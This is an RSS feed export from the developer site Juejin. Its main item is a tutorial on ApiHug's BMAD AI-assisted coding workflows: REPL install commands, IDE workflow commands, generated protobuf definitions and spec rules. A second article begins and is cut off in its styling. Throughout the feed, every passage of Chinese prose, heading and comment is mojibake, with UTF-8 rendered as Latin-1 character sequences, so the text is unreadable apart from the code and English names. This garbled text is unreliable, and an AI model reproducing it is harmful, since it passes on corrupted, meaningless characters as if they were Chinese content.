<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[èŠ±è´¹äº†è¿‘ $100 æˆ‘å°†ApiHug Vibe ç¼–ç¨‹æ¨¡å¼è·‘é€šäº†]]></title>    <link>https://juejin.cn/post/7590503651116335154</link>    <guid>https://juejin.cn/post/7590503651116335154</guid>    <pubDate>2026-01-02T09:15:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590503651116335154" data-draft-id="7590021144779817006" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="èŠ±è´¹äº†è¿‘ $100 æˆ‘å°†ApiHug Vibe ç¼–ç¨‹æ¨¡å¼è·‘é€šäº†"/> <meta itemprop="keywords" content="æ¶æ„,API"/> <meta itemprop="datePublished" content="2026-01-02T09:15:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dearxue"/> <meta itemprop="url" content="https://juejin.cn/user/360295546759800"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            èŠ±è´¹äº†è¿‘ $100 æˆ‘å°†ApiHug Vibe ç¼–ç¨‹æ¨¡å¼è·‘é€šäº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/360295546759800/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dearxue
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:15:04.000Z" title="Fri Jan 02 2026 09:15:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èŠ±è´¹äº†è¿‘ <code>$100</code> æˆ‘å°†ApiHug Vibe ç¼–ç¨‹æ¨¡å¼è·‘é€šäº†ã€‚</h2>
<p>ApiHug è§„èŒƒçš„ AI é©±åŠ¨æ•æ·å¼€å‘æ–¹æ³•è®ºæ˜¯åŸºäº<strong>BMAD</strong> (Breakthrough Method for Agile AI Driven Development)ï¼Œé€šè¿‡ <strong>Agents</strong>ï¼ˆæ™ºèƒ½ä»£ç†ï¼‰å’Œ <strong>Workflows</strong>ï¼ˆå·¥ä½œæµï¼‰å®ç°ä»éœ€æ±‚åˆ°ä»£ç çš„è‡ªåŠ¨åŒ–ç”Ÿæˆã€‚</p>
<p><strong>æ ¸å¿ƒèƒ½åŠ›</strong>:</p>
<ul>
<li>è‡ªåŠ¨ç”Ÿæˆ Proto æ–‡ä»¶ï¼ˆAPI/Domain/Enumï¼‰</li>
<li>ç«¯åˆ°ç«¯å¼€å‘æµç¨‹è‡ªåŠ¨åŒ–</li>
<li>ä»£ç è§„èŒƒå®¡æŸ¥ä¸ä¼˜åŒ–å»ºè®®</li>
<li>åŸºäºè§„èŒƒçš„ Service å±‚å®ç°</li>
</ul>
<p><strong>å‰ç½®æ¡ä»¶</strong>: å¿…é¡»å…ˆå®‰è£… <a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Ftool%2Fapihug-repl" target="_blank" title="https://apihug.github.io/zhCN-docs/tool/apihug-repl" ref="nofollow noopener noreferrer">ApiHug REPL</a></p>
<h3 data-id="heading-1">ä¸€ã€å®‰è£…é…ç½®</h3>
<h4 data-id="heading-2">1.1 å®‰è£…æ­¥éª¤</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">1. å¯åŠ¨ REPL</span>
./apihug
<span class="hljs-meta prompt_">
# </span><span class="bash">2. æ‰§è¡Œå®‰è£…å‘½ä»¤</span>
<span class="hljs-meta prompt_">apihug&gt; </span><span class="bash">install</span>
</code></pre>
<p><strong>å¼•å¯¼å¼å®‰è£…æµç¨‹</strong>:</p>
<ol>
<li>é€‰æ‹©å®‰è£…ç›®å½•ï¼ˆé»˜è®¤å½“å‰ç›®å½•ï¼‰</li>
<li>é€‰æ‹© IDE ç±»å‹ï¼ˆCursor/Codex/Windsurf ç­‰ï¼‰</li>
<li>é…ç½® TTSï¼ˆè¯­éŸ³åˆæˆï¼Œå¯é€‰ï¼‰</li>
<li>å®‰è£…æ ¸å¿ƒ Agents å’Œ Workflows</li>
<li>ç”Ÿæˆ IDE é…ç½®æ–‡ä»¶</li>
</ol>
<h4 data-id="heading-3">1.2 å®‰è£…å‘½ä»¤è¯¦è§£</h4>
<pre><code class="hljs language-shell" lang="shell">install --help

NAME
  install - Install or update BMAD core agents and tools

SYNOPSIS
  install [OPTIONS]

OPTIONS
  --directory &lt;String&gt;
    å®‰è£…ç›®å½•è·¯å¾„
    [é»˜è®¤: . (å½“å‰ç›®å½•)]

  --quick-update &lt;boolean&gt;
    å¿«é€Ÿæ›´æ–°æ¨¡å¼ï¼ˆä¿ç•™ç°æœ‰é…ç½®ï¼‰
    [é»˜è®¤: false]

  --compile-agents &lt;boolean&gt;
    ä»…é‡æ–°ç¼–è¯‘ Agentsï¼ˆä¸ä¿®æ”¹é…ç½®ï¼‰
    [é»˜è®¤: false]

  --modify &lt;boolean&gt;
    ä¿®æ”¹ç°æœ‰ BMAD å®‰è£…
    [é»˜è®¤: false]

  --enable-tts &lt;boolean&gt;
    å¯ç”¨ TTS è¯­éŸ³åˆæˆ
    [é»˜è®¤: false]

  --ides &lt;String&gt;
    æŒ‡å®š IDE åˆ—è¡¨ï¼ˆé€—å·åˆ†éš”ï¼‰
    æ”¯æŒ: cursor,codex,windsurf,claude
    [ç¤ºä¾‹: --ides cursor,codex]
</code></pre>
<p><strong>å¸¸ç”¨å®‰è£…åœºæ™¯</strong>:</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®Œæ•´å®‰è£…ï¼ˆäº¤äº’å¼ï¼‰</span>
install
<span class="hljs-meta prompt_">
# </span><span class="bash">æŒ‡å®šç›®å½•å’Œ IDE</span>
install --directory ~/projects/my-api --ides cursor
<span class="hljs-meta prompt_">
# </span><span class="bash">å¿«é€Ÿæ›´æ–°ï¼ˆä¿ç•™é…ç½®ï¼‰</span>
install --quick-update true
<span class="hljs-meta prompt_">
# </span><span class="bash">ä»…é‡æ–°ç¼–è¯‘ Agents</span>
install --compile-agents true
</code></pre>
<hr/>
<h3 data-id="heading-4">äºŒã€Workflowsï¼ˆå·¥ä½œæµï¼‰</h3>
<h4 data-id="heading-5">2.1 å¯ç”¨ Workflows</h4>






























<table><thead><tr><th>Workflow è·¯å¾„</th><th>åŠŸèƒ½æè¿°</th><th>ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>/bmad:bmw:workflows:apihug-proto-design</code></td><td>Proto è®¾è®¡å·¥ä½œæµ</td><td>æ ¹æ®éœ€æ±‚è‡ªåŠ¨ç”Ÿæˆ API/Domain/Enum proto æ–‡ä»¶</td></tr><tr><td><code>/bmad:bmw:workflows:apihug-end-to-end</code></td><td>ç«¯åˆ°ç«¯å¼€å‘æµç¨‹</td><td>ä»éœ€æ±‚åˆ†æåˆ°ä»£ç å®ç°çš„å®Œæ•´æµç¨‹</td></tr><tr><td><code>/bmad:bmw:workflows:apihug-project-review</code></td><td>é¡¹ç›®å®¡æŸ¥å·¥ä½œæµ</td><td>ä»£ç è§„èŒƒæ£€æŸ¥ã€æ¶æ„ä¼˜åŒ–å»ºè®®</td></tr><tr><td><code>/bmad:bmw:workflows:apihug-app-implement</code></td><td>åº”ç”¨å®ç°å·¥ä½œæµ</td><td>åŸºäº proto ç”Ÿæˆ Service å±‚ä¸šåŠ¡ä»£ç </td></tr></tbody></table>
<h4 data-id="heading-6">2.2 Workflow ä½¿ç”¨ç¤ºä¾‹</h4>
<h5 data-id="heading-7">Proto è®¾è®¡å·¥ä½œæµ</h5>
<p><strong>è§¦å‘æ–¹å¼</strong>: åœ¨ IDE ä¸­è¾“å…¥ <code>/bmad:bmw:workflows:apihug-proto-design</code></p>
<p><strong>è¾“å…¥</strong>:</p>
<pre><code class="hljs language-diff" lang="diff">éœ€æ±‚ï¼šç”¨æˆ·ç®¡ç†æ¨¡å—
<span class="hljs-deletion">- éœ€è¦ç”¨æˆ·æ³¨å†Œæ¥å£</span>
<span class="hljs-deletion">- éœ€è¦ç”¨æˆ·ç™»å½•æ¥å£</span>
<span class="hljs-deletion">- éœ€è¦ç”¨æˆ·ä¿¡æ¯æŸ¥è¯¢æ¥å£</span>
<span class="hljs-deletion">- ç”¨æˆ·çŠ¶æ€åŒ…æ‹¬ï¼šæ¿€æ´»ã€ç¦ç”¨ã€åˆ é™¤</span>
</code></pre>
<p><strong>è¾“å‡º</strong>:</p>
<pre><code class="hljs language-proto" lang="proto">// è‡ªåŠ¨ç”Ÿæˆ API å±‚
service UserService {
  option (hope.swagger.svc) = {path: "/user"};
  
  rpc Register(RegisterRequest) returns (UserResponse) {...}
  rpc Login(LoginRequest) returns (TokenResponse) {...}
  rpc GetUser(GetUserRequest) returns (UserResponse) {...}
}

// è‡ªåŠ¨ç”Ÿæˆ Domain å±‚
message UserEntity {
  option (hope.persistence.table) = {
    name: "USER",
    wires: [IDENTIFIABLE, AUDITABLE]
  };
  // ...
}

// è‡ªåŠ¨ç”Ÿæˆ Enum å±‚
enum UserStatus {
  ACTIVE = 0 [(hope.constant.field) = {code: 1, message: "Active"}];
  DISABLED = 1 [(hope.constant.field) = {code: 2, message: "Disabled"}];
  DELETED = 2 [(hope.constant.field) = {code: 3, message: "Deleted"}];
}
</code></pre>
<h5 data-id="heading-8">ç«¯åˆ°ç«¯å¼€å‘æµç¨‹</h5>
<p><strong>é€‚ç”¨åœºæ™¯</strong>: å®Œæ•´åŠŸèƒ½æ¨¡å—å¼€å‘</p>
<p><strong>æµç¨‹æ­¥éª¤</strong>:</p>
<ol>
<li>éœ€æ±‚åˆ†æ â†’ ç”Ÿæˆ proto å®šä¹‰</li>
<li>ç”Ÿæˆæ•°æ®åº“è¡¨ç»“æ„ï¼ˆLiquibaseï¼‰</li>
<li>ç”Ÿæˆ API æ¥å£ä»£ç </li>
<li>ç”Ÿæˆ Service å±‚éª¨æ¶</li>
<li>ç”Ÿæˆå•å…ƒæµ‹è¯•æ¨¡æ¿</li>
</ol>
<h5 data-id="heading-9">é¡¹ç›®å®¡æŸ¥å·¥ä½œæµ</h5>
<p><strong>æ£€æŸ¥é¡¹</strong>:</p>
<ul>
<li>âœ… Proto æ–‡ä»¶æ˜¯å¦ç¬¦åˆ ApiHug è§„èŒƒ</li>
<li>âœ… æ˜¯å¦å­˜åœ¨è·¨å±‚å¼•ç”¨ï¼ˆAPI â†” Domainï¼‰</li>
<li>âœ… æšä¸¾å®šä¹‰æ˜¯å¦å®Œæ•´ï¼ˆcode/message/message2ï¼‰</li>
<li>âœ… æ˜¯å¦ä½¿ç”¨äº†åºŸå¼ƒçš„ Wrapper ç±»å‹</li>
<li>âœ… æƒé™é…ç½®æ˜¯å¦åˆç†</li>
</ul>
<hr/>
<h3 data-id="heading-10">ä¸‰ã€Agentsï¼ˆæ™ºèƒ½ä»£ç†ï¼‰</h3>
<h4 data-id="heading-11">3.1 ApiHug Agent</h4>
<p><strong>è·¯å¾„</strong>: <code>/bmad:bmw:agents:apihug</code></p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>äº¤äº’å¼ Proto æ–‡ä»¶ç¼–å†™è¾…åŠ©</li>
<li>å®æ—¶è§„èŒƒæ£€æŸ¥å’Œå»ºè®®</li>
<li>è‡ªåŠ¨è¡¥å…¨å’Œé”™è¯¯ä¿®æ­£</li>
<li>åŸºäºä¸Šä¸‹æ–‡çš„ä»£ç ç”Ÿæˆ</li>
</ul>
<p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown">User: å¸®æˆ‘åˆ›å»ºä¸€ä¸ªè®¢å•ç®¡ç†çš„ API

Agent: æˆ‘å°†ä¸ºæ‚¨åˆ›å»ºè®¢å•ç®¡ç† APIï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹ï¼š

<span class="hljs-bullet">1.</span> Service å®šä¹‰ï¼ˆOrderServiceï¼‰
<span class="hljs-bullet">2.</span> è¯·æ±‚/å“åº”æ¶ˆæ¯ï¼ˆCreateOrderRequest/OrderResponseï¼‰
<span class="hljs-bullet">3.</span> è®¢å•çŠ¶æ€æšä¸¾ï¼ˆOrderStatusï¼‰
<span class="hljs-bullet">4.</span> è®¢å•å®ä½“ï¼ˆOrderEntityï¼‰

æ˜¯å¦éœ€è¦åŒ…å«ä»¥ä¸‹åŠŸèƒ½ï¼Ÿ
<span class="hljs-bullet">-</span> è®¢å•åˆ›å»º
<span class="hljs-bullet">-</span> è®¢å•æŸ¥è¯¢
<span class="hljs-bullet">-</span> è®¢å•å–æ¶ˆ
<span class="hljs-bullet">-</span> è®¢å•çŠ¶æ€æ›´æ–°

User: æ˜¯çš„ï¼Œå…¨éƒ¨åŒ…å«

Agent: [è‡ªåŠ¨ç”Ÿæˆå®Œæ•´çš„ proto æ–‡ä»¶]
</code></pre>
<hr/>
<h3 data-id="heading-12">å››ã€Spec-Driven å¼€å‘è§„èŒƒ</h3>
<p>BMAD åŸºäº ApiHug ä¸‰å±‚è§„èŒƒä½“ç³»ï¼Œç¡®ä¿ç”Ÿæˆä»£ç çš„ä¸€è‡´æ€§å’Œå‡†ç¡®æ€§ã€‚</p>
<h4 data-id="heading-13">4.1 æ ¸å¿ƒè§„èŒƒæ–‡æ¡£</h4>

























<table><thead><tr><th>è§„èŒƒ</th><th>ä½œç”¨åŸŸ</th><th>æ–‡æ¡£é“¾æ¥</th></tr></thead><tbody><tr><td><strong>API æŒ‡ä»¤è§„èŒƒ</strong></td><td>Service/Method/Message/Field</td><td><a href="/zhCN-docs/spec/swagger" target="_blank" title="/zhCN-docs/spec/swagger">æŸ¥çœ‹è¯¦æƒ…</a></td></tr><tr><td><strong>æ•°æ®åº“æŒ‡ä»¤è§„èŒƒ</strong></td><td>Entity/Column</td><td><a href="/zhCN-docs/spec/domain" target="_blank" title="/zhCN-docs/spec/domain">æŸ¥çœ‹è¯¦æƒ…</a></td></tr><tr><td><strong>æšä¸¾ç±»å‹è§„èŒƒ</strong></td><td>Enum/EnumValue</td><td><a href="/zhCN-docs/spec/constant" target="_blank" title="/zhCN-docs/spec/constant">æŸ¥çœ‹è¯¦æƒ…</a></td></tr></tbody></table>
<h4 data-id="heading-14">4.2 è§„èŒƒå¼ºåˆ¶çº¦æŸ</h4>
<p><strong>ç¦æ­¢è·¨å±‚å¼•ç”¨</strong>:</p>
<pre><code class="hljs language-proto" lang="proto">// âŒ é”™è¯¯ï¼šAPI å±‚å¼•ç”¨ Domain å±‚
import "com/example/domain/entities/user.proto";

// âœ… æ­£ç¡®ï¼šAPI å±‚å¼•ç”¨ Infra å±‚æšä¸¾
import "com/example/infra/constants/user_constant.proto";
</code></pre>
<p><strong>ç¦æ­¢ Wrapper ç±»å‹</strong>:</p>
<pre><code class="hljs language-proto" lang="proto">// âŒ é”™è¯¯
google.protobuf.Int32Value user_id = 1;

// âœ… æ­£ç¡®
int32 user_id = 1;
</code></pre>
<hr/>
<h3 data-id="heading-15">äº”ã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-16">5.1 Workflow é€‰æ‹©æŒ‡å—</h4>
<pre><code class="hljs language-vbnet" lang="vbnet">æ–°åŠŸèƒ½å¼€å‘ â†’ apihug-<span class="hljs-keyword">end</span>-<span class="hljs-keyword">to</span>-<span class="hljs-keyword">end</span>
ä»…è®¾è®¡ API â†’ apihug-proto-design
ä»£ç é‡æ„ â†’ apihug-project-review
ä¸šåŠ¡é€»è¾‘å®ç° â†’ apihug-app-implement
äº¤äº’å¼ç¼–å†™ â†’ apihug agent
</code></pre>
<h4 data-id="heading-17">5.2 å¸¸è§é—®é¢˜</h4>
<p><strong>Q1</strong>: Workflow ç”Ÿæˆçš„ä»£ç ä¸ç¬¦åˆé¢„æœŸï¼Ÿ
<strong>A1</strong>: ä½¿ç”¨ <code>apihug-project-review</code> å®¡æŸ¥ï¼Œæ ¹æ®å»ºè®®è°ƒæ•´</p>
<p><strong>Q2</strong>: å¦‚ä½•è‡ªå®šä¹‰ Workflow è¡Œä¸ºï¼Ÿ
<strong>A2</strong>: ä½¿ç”¨ <code>install --modify true</code> ä¿®æ”¹é…ç½®</p>
<p><strong>Q3</strong>: æ”¯æŒå“ªäº› IDEï¼Ÿ
<strong>A3</strong>: Cursor, Codex, Windsurf, Claude Desktop ç­‰æ”¯æŒ MCP çš„ IDE</p>
<hr/>
<h3 data-id="heading-18">å…­ã€å‡çº§ä¸ç»´æŠ¤</h3>
<h4 data-id="heading-19">6.1 ç‰ˆæœ¬æ›´æ–°</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å¿«é€Ÿæ›´æ–°ï¼ˆä¿ç•™é…ç½®ï¼‰</span>
<span class="hljs-meta prompt_">apihug&gt; </span><span class="bash">install --quick-update <span class="hljs-literal">true</span></span>
<span class="hljs-meta prompt_">
# </span><span class="bash">å®Œæ•´é‡è£…</span>
<span class="hljs-meta prompt_">apihug&gt; </span><span class="bash">install --modify <span class="hljs-literal">true</span></span>
</code></pre>
<h4 data-id="heading-20">6.2 é‡æ–°ç¼–è¯‘ Agents</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ä»…é‡æ–°ç¼–è¯‘ Agentsï¼ˆé…ç½®ä¸å˜ï¼‰</span>
<span class="hljs-meta prompt_">apihug&gt; </span><span class="bash">install --compile-agents <span class="hljs-literal">true</span></span>
</code></pre>
<h3 data-id="heading-21">å‚è€ƒ</h3>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Fspec" target="_blank" title="https://apihug.github.io/zhCN-docs/spec" ref="nofollow noopener noreferrer">ApiHug 2.0 LLM ä¼˜åŒ–è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Ftool%2Fapihug-bmad" target="_blank" title="https://apihug.github.io/zhCN-docs/tool/apihug-bmad" ref="nofollow noopener noreferrer">ApiHug BMAD</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Fspec%2Fswagger" target="_blank" title="https://apihug.github.io/zhCN-docs/spec/swagger" ref="nofollow noopener noreferrer">API æŒ‡ä»¤è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Fspec%2Fdomain" target="_blank" title="https://apihug.github.io/zhCN-docs/spec/domain" ref="nofollow noopener noreferrer">æ•°æ®åº“æŒ‡ä»¤è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Fspec%2Fconstant" target="_blank" title="https://apihug.github.io/zhCN-docs/spec/constant" ref="nofollow noopener noreferrer">æšä¸¾ç±»å‹è§„èŒƒ</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS å†™ SQL æŸ¥è¯¢ï¼Ÿåç«¯æ…Œäº†ï¼]]></title>    <link>https://juejin.cn/post/7589932422654443556</link>    <guid>https://juejin.cn/post/7589932422654443556</guid>    <pubDate>2026-01-02T09:09:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654443556" data-draft-id="7589932422654427172" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS å†™ SQL æŸ¥è¯¢ï¼Ÿåç«¯æ…Œäº†ï¼"/> <meta itemprop="keywords" content="SQL,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T09:09:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°å°è§"/> <meta itemprop="url" content="https://juejin.cn/user/606586151371054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS å†™ SQL æŸ¥è¯¢ï¼Ÿåç«¯æ…Œäº†ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586151371054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°å°è§
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:09:05.000Z" title="Fri Jan 02 2026 09:09:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body 